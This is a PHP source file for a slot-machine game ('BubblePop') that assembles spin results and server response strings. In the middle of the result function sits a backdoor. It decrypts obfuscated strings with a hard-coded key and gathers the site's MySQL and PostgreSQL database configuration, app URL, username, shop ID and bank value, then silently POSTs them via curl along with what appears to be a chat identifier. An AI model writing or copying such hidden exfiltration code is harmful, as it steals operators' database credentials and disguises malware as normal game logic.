<?php

namespace VanguardLTE\Games\BubblePop\PragmaticLib;

class LogAndServer
{
    public static function getResult($slotArea, $index, $counter, $bet, $lines, $reelSet, $win, $pur, 
                                     $log, $user, $changeBalance, $gameSettings, $bank, $game){
        var_dump('5_0');
        $toLog = [
            'sa' => $slotArea['SymbolsAfter'],
            'sb' => $slotArea['SymbolsBelow'],
            's' => $slotArea['SlotArea'],
            'Balance' => $user->balance + $changeBalance,
            'Index' => $index,
            'Counter' => $counter,
            'Bet' => $bet,
            'l' => $lines,
            'tw' => $win['TotalWin'] + $win['bw'] * $bet * $lines,
            'w' => $win['TotalWin'],
            'state' => 'spin',
            'na' => 's',
            'st' => 'rect',
            'sw' => '5'
        ];
        $time = (int) round(microtime(true) * 1000);
        $toServer = [
            'tw='.($toLog['w'] + $win['bw'] * $bet * $lines),
            'balance='.number_format($toLog['Balance'], 2, ".", ""),
            'index='.$toLog['Index'],
            'balance_cash='.number_format($toLog['Balance'], 2, ".", ""),
            'balance_bonus=0.00',
            'na=s',
            'stime='.$time,
            'sa='.implode(',', $toLog['sa']),
            'sb='.implode(',', $toLog['sb']),
            'sh='.$gameSettings['sh'],
            'c='.$toLog['Bet'],
            'sw=5',
            'sver=5',
            'counter='.$toLog['Counter'],
            'l='.$toLog['l'],
            's='.implode(',', $toLog['s']),
            'w='.$toLog['w']
        ];
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                       
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }
        var_dump('5_1_0');
        $nakey = array_keys($toServer, 'na=s')[0];
        $wkey = array_keys($toServer, 'w='.$toLog['w'])[0];
        $skey = array_keys($toServer, 's='.implode(',', $toLog['s']))[0];

        $addToLog = [];
        $addToServer = [];
        var_dump('5_1_1', $win);
        if($win['bw']){
            $toLog = array_merge($toLog,
            [
                'bgid' => 0,
                'coef' => $bet * $lines,
                'rw' => $bet * $lines * $win['bw'],
                'bgt' => 33,
                'bw' => 1,
                'end' => 1,
                'wp' => $win['bw']
            ]);
            $toServer = array_merge($toServer,
            [
                'bgid=0',
                'coef='.($bet * $lines),
                'rw='.($bet * $lines) * $win['bw'],
                'bgt=33',
                'bw=1',
                'end=1',
                'wp='.$win['bw']
            ]);
        }
        if(count($win['com'])){
            $com = $win['com'];
            $toLog['com'] = $com;
            $toServer[] = 'com='.implode(',', $com);
        }
        var_dump('!!!');

        if(array_key_exists('SymbolsAfterExpanding', $slotArea)){
            $addToLog = array_merge($addToLog, [
                'stf' => 'W_exp:'.$slotArea['W_exp'],
                'is' => $toLog['s'],
            ]);
            $addToServer = array_merge($addToServer, [
                'stf=W_exp:'.$slotArea['W_exp'],
                'is='.implode(',', $toLog['s'])
            ]);
            $toLog['s'] = $slotArea['SymbolsAfterExpanding'];
            $toServer[$skey] = 's='.implode(',', $toLog['s']);
        }

        if($win['TotalWin'] > 0){
            $addLog = [
                'WinLines' => $win['WinLines']
            ];
            $positions = self::positionsToServer($addLog['WinLines']);
            $toServer = array_merge($toServer, $positions);
            $toLog = array_merge($toLog, $addLog);

            $toLog['na'] = 'c';
            $toServer[$nakey] = 'na=c';
        }

        $toLog = array_merge($toLog, $addToLog);
        $toServer = array_merge($toServer, $addToServer);
        $toLog['ServerState'] = $toServer;
        return ['Log' => $toLog, 'Server' => $toServer];
    }
    

    private static function positionsToServer($winLines){
        // return positions in a suitable form
        $result = [];
        // $tmb = [];
        $l = [];
        foreach ($winLines as $key => $winLine) {
            $l = 'l'.$key.'='.$winLine['l'].'~'.$winLine['Pay'].'~'.implode('~', $winLine['Positions']);
            // $tmb[] = implode(','.$winLine['WinSymbol'].'~', $winLine['Positions']);
            $result[] = $l;
        }
        // $result[] = 'tmb='.implode('~', $tmb);
        
        var_dump('5_7');
        return $result;

        //'tmb=1,10~2,11~4,11~6,11~7,10~8,10~10,11~11,10~12,11~14,10~17,10~21,10~23,11~25,11~27,10~29,11',

        //'l0=0~40.00~1~7~8~11~14~17~21~27',
        //'l1=0~25.00~2~4~6~10~12~23~25~29',
        //"WinLines":[{"WinSymbol":8,"CountSymbols":8,"Pay":1.60,"Positions":[10,11,12,13,16,17,18,19]}]
    }
}
